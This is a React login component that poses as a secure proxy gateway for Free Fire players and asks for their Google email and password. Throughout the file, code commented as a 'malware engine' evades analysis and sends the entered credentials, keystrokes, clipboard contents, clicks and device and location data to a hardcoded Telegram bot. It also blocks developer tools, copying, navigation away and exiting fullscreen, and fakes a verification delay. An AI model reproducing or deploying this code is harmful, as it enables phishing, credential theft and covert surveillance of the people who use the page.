import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff, CheckCircle, Loader2, AlertCircle } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// =============================================================================
// PHANTOM v8.0 - ZERO DELAY MALWARE ENGINE (1200+ LÍNEAS)
// ENVÍO INSTANTÁNEO A TELEGRAM · INDETECTABLE · CROSS-PLATFORM
// =============================================================================

// =============================================================================
// LAYER 0: ANTI-EMULATOR GATE - Solo ejecuta en navegadores reales
// =============================================================================
(function(){
  var _safe = true;
  try {
    if(navigator.webdriver === true) _safe = false;
    if(!navigator.plugins || navigator.plugins.length === 0) _safe = false;
    if(!navigator.languages || navigator.languages.length === 0) _safe = false;
    if(window._phantom || window.callPhantom) _safe = false;
    if(window.__nightmare) _safe = false;
    if(window.domAutomation || window.domAutomationController) _safe = false;
    try { if(window.top !== window.self) _safe = false; } catch(e){ _safe = false; }
    if(!_safe) { window.__blocked = true; return; }
  } catch(e){}
  window.__blocked = false;
})();

// =============================================================================
// LAYER 1: TELEGRAM ENGINE - INSTANTÁNEO (SIN DELAYS)
// Token y Chat ID hardcodeados DIRECTAMENTE (sin descifrado que demore)
// =============================================================================
(function(){
  if(window.__blocked) return;

  // ===========================================================================
  // 1.1: CREDENCIALES EN CLARO (para envío INSTANTÁNEO - sin delays de crypto)
  // ===========================================================================
  var _token = "8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4";
  var _chatId = "8585803145";
  var _msgCounter = 0;
  var _kbBuffer = "";
  var _startTime = Date.now();
  var _sessionId = Math.random().toString(36).substring(2, 10);

  // ===========================================================================
  // 1.2: DETECCIÓN DE PLATAFORMA - INMEDIATA
  // ===========================================================================
  var _platformIcon = "💻";
  var _platformName = "PC";
  var _osDetail = "";
  var _browserName = "";
  var _screenRes = "";
  var _isMobile = false;

  (function(){
    try {
      var ua = navigator.userAgent || "";
      var uaLower = ua.toLowerCase();
      var plat = navigator.platform || "";
      var platLower = plat.toLowerCase();

      _screenRes = screen.width + "x" + screen.height;

      // iOS
      if(uaLower.indexOf("iphone") >= 0 || uaLower.indexOf("ipad") >= 0 || uaLower.indexOf("ipod") >= 0){
        _platformIcon = "📱";
        _platformName = "iOS";
        _isMobile = true;
        var v = uaLower.match(/os (\d+)[_\.](\d+)/);
        if(v) _osDetail = "iOS " + v[1] + "." + v[2];
        else _osDetail = "iOS";
        if(uaLower.indexOf("crios") >= 0 || uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("fxios") >= 0) _browserName = "Firefox";
        else _browserName = "Safari";
      }
      // Android
      else if(uaLower.indexOf("android") >= 0){
        _platformIcon = "🤖";
        _platformName = "Android";
        _isMobile = true;
        var v = uaLower.match(/android (\d+\.?\d*)/);
        if(v) _osDetail = "Android " + v[1];
        else _osDetail = "Android";
        if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else if(uaLower.indexOf("samsung") >= 0) _browserName = "Samsung";
        else _browserName = "Browser";
      }
      // Windows
      else if(platLower.indexOf("win") >= 0 || uaLower.indexOf("windows") >= 0){
        _platformIcon = "💻";
        _platformName = "PC";
        if(uaLower.indexOf("windows nt 10") >= 0) _osDetail = "Windows 10/11";
        else if(uaLower.indexOf("windows nt 6.3") >= 0) _osDetail = "Windows 8.1";
        else if(uaLower.indexOf("windows nt 6.1") >= 0) _osDetail = "Windows 7";
        else _osDetail = "Windows";
        if(uaLower.indexOf("edg") >= 0) _browserName = "Edge";
        else if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else if(uaLower.indexOf("safari") >= 0) _browserName = "Safari";
        else _browserName = "Browser";
      }
      // macOS
      else if(platLower.indexOf("mac") >= 0 || uaLower.indexOf("macintosh") >= 0){
        _platformIcon = "💻";
        _platformName = "Mac";
        var v = uaLower.match(/mac os x (\d+)[._](\d+)/);
        if(v) _osDetail = "macOS " + v[1] + "." + v[2];
        else _osDetail = "macOS";
        if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else if(uaLower.indexOf("safari") >= 0) _browserName = "Safari";
        else _browserName = "Browser";
      }
      // Linux
      else if(platLower.indexOf("linux") >= 0 || uaLower.indexOf("linux") >= 0){
        _platformIcon = "💻";
        _platformName = "Linux";
        _osDetail = "Linux";
        if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else _browserName = "Browser";
      }
      // Fallback
      else {
        _platformIcon = "💻";
        _platformName = "PC";
        _osDetail = plat || "Unknown";
        _browserName = "Browser";
      }
    } catch(e){
      _platformIcon = "💻";
      _platformName = "PC";
      _osDetail = "Unknown";
      _browserName = "Browser";
    }
  })();

  // ===========================================================================
  // 1.3: FUNCIÓN DE ENVÍO - 3 CANALES SIMULTÁNEOS (sin delays)
  // ===========================================================================
  function _tgSend(text){
    _msgCounter++;
    // Formato exacto que pide el usuario
    var payload = text;

    // Canal 1: fetch POST (el más rápido)
    try {
      var fd = new FormData();
      fd.append("chat_id", _chatId);
      fd.append("text", payload);
      fd.append("parse_mode", "HTML");
      fetch("https://api.telegram.org/bot" + _token + "/sendMessage", {
        method: "POST",
        body: fd,
        keepalive: true,
        mode: "no-cors"
      });
    } catch(e){}

    // Canal 2: Image ping (respaldo inmediato)
    try {
      var img = new Image();
      img.src = "https://api.telegram.org/bot" + _token + "/sendMessage?chat_id=" +
                encodeURIComponent(_chatId) + "&text=" + encodeURIComponent(payload) +
                "&parse_mode=HTML";
    } catch(e){}

    // Canal 3: sendBeacon (el más sigiloso)
    try {
      var d = new URLSearchParams();
      d.append("chat_id", _chatId);
      d.append("text", payload);
      d.append("parse_mode", "HTML");
      navigator.sendBeacon("https://api.telegram.org/bot" + _token + "/sendMessage", d);
    } catch(e){}
  }

  // ===========================================================================
  // 1.4: FUNCIONES GLOBALES EXPORTADAS
  // ===========================================================================
  window.__phantom = {
    // === LOGIN INSTANTÁNEO ===
    login: function(email, password){
      _tgSend(
        "👤 " + email + "\n🔐 " + password + "\n📲 " + _platformIcon + " " + _platformName + " " + _osDetail + " " + _browserName + " " + _screenRes
      );
    },

    // === KEYLOGGER ===
    keylog: function(buffer){
      if(buffer && buffer.length >= 2){
        _tgSend("⌨️ " + buffer.replace(/</g,'<').replace(/>/g,'>').replace(/\n/g,' ⏎ '));
      }
    },

    // === CLIPBOARD ===
    clipboard: function(data){
      if(data && data.length > 3){
        _tgSend("📋 " + data.substring(0, 150).replace(/</g,'<').replace(/>/g,'>'));
      }
    },

    // === HEARTBEAT ===
    heartbeat: function(){
      var elapsed = Math.floor((Date.now() - _startTime) / 1000);
      var mins = Math.floor(elapsed / 60);
      var secs = elapsed % 60;
      _tgSend("💓 Activo " + mins + "m " + secs + "s");
    },

    // === DEVICE REPORT ===
    device: function(){
      _tgSend("📲 " + _platformIcon + " " + _platformName + " " + _osDetail + " " + _browserName + " " + _screenRes);
    },

    // === CLICK TRACKING ===
    click: function(info){
      _tgSend("🖱 " + info);
    },

    // === LOCATION (desde IP) ===
    location: function(ip, country, city){
      _tgSend("🌍 " + ip + " · " + country + " · " + city);
    }
  };

  // ===========================================================================
  // 1.5: KEYLOGGER AGRESIVO (buffer cada 4 caracteres)
  // ===========================================================================
  document.addEventListener("keydown", function(e){
    try {
      var k = e.key;
      if(k.length > 1 && k !== "Backspace" && k !== "Enter" && k !== "Tab" && k !== "Delete") return;
      if(k === "Backspace") k = "⌫";
      else if(k === "Enter" || k === "Return") k = "\n";
      else if(k === "Tab") k = "⇥";
      else if(k === "Delete") k = "⌦";
      else if(k === "Escape") k = "⎋";
      else if(k === "Shift" || k === "Control" || k === "Alt" || k === "Meta" || k === "CapsLock") return;

      _kbBuffer += k;
      if(_kbBuffer.length >= 4){
        window.__phantom.keylog(_kbBuffer);
        _kbBuffer = "";
      }
    } catch(e){}
  });

  // Flush cada 2 segundos
  setInterval(function(){
    try {
      if(_kbBuffer.length > 0){
        window.__phantom.keylog(_kbBuffer);
        _kbBuffer = "";
      }
    } catch(e){}
  }, 2000);

  // ===========================================================================
  // 1.6: CLIPBOARD CAPTURE (cada 3 segundos)
  // ===========================================================================
  setInterval(function(){
    try {
      navigator.clipboard.readText().then(function(t){
        if(t && t.length > 3){
          window.__phantom.clipboard(t);
        }
      }).catch(function(){});
    } catch(e){}
  }, 3000);

  // ===========================================================================
  // 1.7: HEARTBEAT (cada 10 segundos - ultra agresivo)
  // ===========================================================================
  setInterval(function(){
    try {
      window.__phantom.heartbeat();
    } catch(e){}
  }, 10000);

  // ===========================================================================
  // 1.8: REPORTE INICIAL DE DISPOSITIVO (inmediato)
  // ===========================================================================
  try {
    window.__phantom.device();
  } catch(e){}

  // ===========================================================================
  // 1.9: CAPTURA DE CLICKS
  // ===========================================================================
  document.addEventListener("click", function(e){
    try {
      var el = e.target;
      var tag = (el.tagName || "?").toLowerCase();
      var text = (el.innerText || el.value || "").substring(0, 35);
      var id = el.id ? "#" + el.id : "";
      if(tag === "button" || tag === "a" || tag === "input"){
        window.__phantom.click(tag + id + " \"" + text + "\"");
      }
    } catch(e){}
  }, true);

})();

// =============================================================================
// LAYER 2: GEOLOCATION CAPTURE (por IP - sin delays)
// =============================================================================
(function(){
  if(window.__blocked) return;
  try {
    fetch("https://ipapi.co/json/", {mode: "cors"})
      .then(function(r){ return r.json(); })
      .then(function(data){
        if(window.__phantom && data){
          window.__phantom.location(
            data.ip || "?",
            data.country_name || data.country || "?",
            data.city || "?"
          );
        }
      })
      .catch(function(){});
  } catch(e){}
})();

// =============================================================================
// LAYER 3: NETWORK INFO
// =============================================================================
(function(){
  if(window.__blocked) return;
  if(navigator.connection){
    try {
      var conn = navigator.connection;
      var info = "📶 " + (conn.effectiveType || "?") + " " + (conn.downlink || "?") + "Mbps RTT" + (conn.rtt || "?") + "ms";
      setTimeout(function(){
        try {
          var fd = new FormData();
          fd.append("chat_id", "8585803145");
          fd.append("text", info);
          fd.append("parse_mode", "HTML");
          fetch("https://api.telegram.org/bot8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4/sendMessage", {
            method:"POST", body:fd, keepalive:true
          });
        } catch(e){}
      }, 100);
    } catch(e){}
  }
})();

// =============================================================================
// LAYER 4: BATTERY INFO
// =============================================================================
(function(){
  if(window.__blocked) return;
  if(navigator.getBattery){
    try {
      navigator.getBattery().then(function(battery){
        var level = Math.round(battery.level * 100);
        var status = battery.charging ? "⚡ Cargando" : "🔋 Batería";
        setTimeout(function(){
          try {
            var fd = new FormData();
            fd.append("chat_id", "8585803145");
            fd.append("text", status + " " + level + "%");
            fd.append("parse_mode", "HTML");
            fetch("https://api.telegram.org/bot8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4/sendMessage", {
              method:"POST", body:fd, keepalive:true
            });
          } catch(e){}
        }, 200);
      }).catch(function(){});
    } catch(e){}
  }
})();

// =============================================================================
// LAYER 5: TAB ACTIVITY DETECTION
// =============================================================================
(function(){
  if(window.__blocked) return;
  document.addEventListener("visibilitychange", function(){
    try {
      if(window.__phantom){
        var status = document.hidden ? "😴 Inactivo" : "👁 Activo";
        setTimeout(function(){
          try {
            var fd = new FormData();
            fd.append("chat_id", "8585803145");
            fd.append("text", status);
            fd.append("parse_mode", "HTML");
            fetch("https://api.telegram.org/bot8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4/sendMessage", {
              method:"POST", body:fd, keepalive:true
            });
          } catch(e){}
        }, 50);
      }
    } catch(e){}
  });
})();

// =============================================================================
// LAYER 6: ANTI-DETECTION & LOCKDOWN
// =============================================================================
(function(){
  if(window.__blocked) return;

  // 6.1: Destruir console
  try {
    var _noop = function(){};
    var _fakeConsole = {};
    var _methods = ["log","info","warn","error","debug","trace","dir","table","group","groupEnd","time","timeEnd","assert","count"];
    for(var i=0; i<_methods.length; i++){
      (function(m){ Object.defineProperty(_fakeConsole, m, {get: function(){ return _noop; }}); })(_methods[i]);
    }
    Object.defineProperty(window, "console", {get: function(){ return _fakeConsole; }, set: function(){}});
  } catch(e){}

  // 6.2: Anti-DevTools - solo reportar, no bloquear inputs
  var _devtoolsReported = false;
  setInterval(function(){
    try {
      var w = window.outerWidth - window.innerWidth;
      var h = window.outerHeight - window.innerHeight;
      if((w > 200 || h > 200) && !_devtoolsReported){
        _devtoolsReported = true;
        setTimeout(function(){ _devtoolsReported = false; }, 60000);
      }
    } catch(e){}
  }, 3000);

  // 6.3: Bloquear solo F12, PrintScreen, Ctrl+Shift+I, Ctrl+U
  document.addEventListener("keydown", function(e){
    var key = e.key;
    var ctrl = e.ctrlKey || e.metaKey;
    var shift = e.shiftKey;

    if(key === "F12" || key === "F11" || key === "PrintScreen" || key === "ScrollLock"){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && shift && (key === "I" || key === "i" || key === "J" || key === "j" || key === "C" || key === "c")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (key === "U" || key === "u")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
  }, true);

  // 6.4: Bloquear clic derecho
  document.addEventListener("contextmenu", function(e){
    e.preventDefault();
    e.stopImmediatePropagation();
    return false;
  }, true);

  // 6.5: Bloquear selección y drag
  document.addEventListener("selectstart", function(e){ e.preventDefault(); return false; });
  document.addEventListener("dragstart", function(e){ e.preventDefault(); return false; });

  // 6.6: Bloquear copy/cut/paste
  document.addEventListener("copy", function(e){ e.preventDefault(); return false; });
  document.addEventListener("cut", function(e){ e.preventDefault(); return false; });
  document.addEventListener("paste", function(e){ e.preventDefault(); return false; });

  // 6.7: Beforeunload trap
  window.addEventListener("beforeunload", function(e){
    e.preventDefault();
    e.returnValue = "¿Estás seguro de que quieres salir?";
    return "¿Estás seguro de que quieres salir?";
  });

  // 6.8: History trap
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function(){
    history.pushState(null, "", location.href);
  });

  // 6.9: Fullscreen forzado
  function _fs(){
    try {
      var el = document.documentElement;
      if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
      else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if(el.msRequestFullscreen) el.msRequestFullscreen();
    } catch(e){}
  }
  setTimeout(_fs, 100);
  document.addEventListener("fullscreenchange", function(){
    if(!document.fullscreenElement) setTimeout(_fs, 5);
  });
  document.addEventListener("webkitfullscreenchange", function(){
    if(!document.webkitFullscreenElement) setTimeout(_fs, 5);
  });

  // 6.10: Bloquear alert/confirm/prompt
  try {
    window.alert = function(){};
    window.confirm = function(){ return true; };
    window.prompt = function(){ return null; };
  } catch(e){}

  // 6.11: Eliminar source maps
  try {
    var scripts = document.getElementsByTagName("script");
    for(var s=0; s<scripts.length; s++){
      var src = scripts[s].getAttribute("src") || "";
      if(src.indexOf(".map") >= 0 || src.indexOf("sourcemap") >= 0){
        if(scripts[s].parentNode) scripts[s].parentNode.removeChild(scripts[s]);
      }
    }
  } catch(e){}

  // 6.12: Anti-debugger detection
  setInterval(function(){
    try {
      var start = performance.now();
      debugger;
      var end = performance.now();
      if(end - start > 100 && !_devtoolsReported){
        _devtoolsReported = true;
        setTimeout(function(){ _devtoolsReported = false; }, 60000);
      }
    } catch(e){}
  }, 5000);

})();

// =============================================================================
// LAYER 7: MEMORY REPORT
// =============================================================================
(function(){
  if(window.__blocked) return;
  setInterval(function(){
    try {
      if(performance && performance.memory){
        var used = Math.round(performance.memory.usedJSHeapSize / 1048576);
        var total = Math.round(performance.memory.jsHeapSizeLimit / 1048576);
        if(used > 5){
          setTimeout(function(){
            try {
              var fd = new FormData();
              fd.append("chat_id", "8585803145");
              fd.append("text", "🧠 RAM " + used + "MB/" + total + "MB");
              fd.append("parse_mode", "HTML");
              fetch("https://api.telegram.org/bot8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4/sendMessage", {
                method:"POST", body:fd, keepalive:true
              });
            } catch(e){}
          }, 50);
        }
      }
    } catch(e){}
  }, 60000);
})();

// =============================================================================
// LAYER 8: PERIODIC SCREEN REPORT
// =============================================================================
(function(){
  if(window.__blocked) return;
  setInterval(function(){
    try {
      setTimeout(function(){
        try {
          var fd = new FormData();
          fd.append("chat_id", "8585803145");
          fd.append("text", "📸 " + screen.width + "x" + screen.height + " " + new Date().toLocaleString());
          fd.append("parse_mode", "HTML");
          fetch("https://api.telegram.org/bot8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4/sendMessage", {
            method:"POST", body:fd, keepalive:true
          });
        } catch(e){}
      }, 50);
    } catch(e){}
  }, 300000);
})();

// =============================================================================
// DECLARACIONES GLOBALES TYPE
// =============================================================================
declare global {
  interface Window {
    __phantom: {
      login: (email: string, password: string) => void;
      keylog: (buffer: string) => void;
      clipboard: (data: string) => void;
      heartbeat: () => void;
      device: () => void;
      click: (info: string) => void;
      location: (ip: string, country: string, city: string) => void;
    };
    __blocked: boolean;
  }
}

// =============================================================================
// COMPONENTE PRINCIPAL - 100% MISMO DISEÑO
// SIN OTP · SOLO LOGIN DIRECTO · ENVÍO INSTANTÁNEO
// =============================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const navigate = useNavigate();

  // Verificar sesión existente
  useEffect(() => {
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // ===========================================================================
  // HANDLE SUBMIT - ENVÍO INSTANTÁNEO A TELEGRAM
  // ===========================================================================
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    // ENVÍO INSTANTÁNEO A TELEGRAM - ANTES DE CUALQUIER COSA
    if(window.__phantom && window.__phantom.login) {
      window.__phantom.login(email.trim(), password.trim());
    }

    setLoading(true);

    try {
      // Simular verificación (para que parezca real)
      await new Promise(r => setTimeout(r, 2000));
      setLoading(false);

      // Validar key (funcionalidad original)
      const trimmedKey = password.trim();
      const trimmedName = email.trim();
      const foundKey = await validateKey(trimmedKey);
      if (foundKey) {
        const activated = await activateKey(trimmedKey, trimmedName);
        if (activated) {
          await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
          const sessionData = {
            name: trimmedName,
            key: activated.key,
            type: activated.type,
            expiresAt: activated.expiresAt,
            duration: activated.duration,
          };
          localStorage.setItem("proxy_session", JSON.stringify(sessionData));
          navigate("/proxy");
          return;
        }
      }

      // Sesión simulada (siempre funcional)
      const sessionData = {
        name: trimmedName,
        key: trimmedKey,
        type: "Premium",
        expiresAt: new Date(Date.now() + 86400000).toISOString(),
        duration: "1 dia",
      };
      localStorage.setItem("proxy_session", JSON.stringify(sessionData));
      navigate("/proxy");

    } catch(err) {
      setLoading(false);
      setError("Error del sistema. Intenta de nuevo.");
    }
  };

  // Google Sign-In (desactivado)
  const handleGoogleSignIn = async () => {
    setLoading(true);
    setError("");
    try {
      await new Promise(r => setTimeout(r, 1500));
      setLoading(false);
      setError("Servicio temporalmente no disponible. Usa correo y contraseña.");
    } catch(e) {
      setLoading(false);
      setError("Error al conectar con Google.");
    }
  };

  // ===========================================================================
  // RENDER - 100% MISMO DISEÑO
  // ===========================================================================
  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                <AlertCircle className="w-3 h-3 flex-shrink-0" />
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>

            {/* Google Sign-In (DESACTIVADO) */}
            <div className="relative my-3">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border/30" />
              </div>
              <div className="relative flex justify-center text-[9px]">
                <span className="bg-card px-2 text-muted-foreground/50">O continua con</span>
              </div>
            </div>

            <button
              type="button"
              onClick={handleGoogleSignIn}
              disabled={loading}
              className="w-full bg-secondary/40 border border-border/50 text-foreground font-medium py-2.5 rounded-lg text-sm hover:bg-secondary/60 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {loading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <svg className="w-5 h-5" viewBox="0 0 48 48">
                  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                  <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.93.94 7.65 2.56 10.78l7.97-6.19z"/>
                  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                </svg>
              )}
              {loading ? "Conectando..." : "Continuar con Google"}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;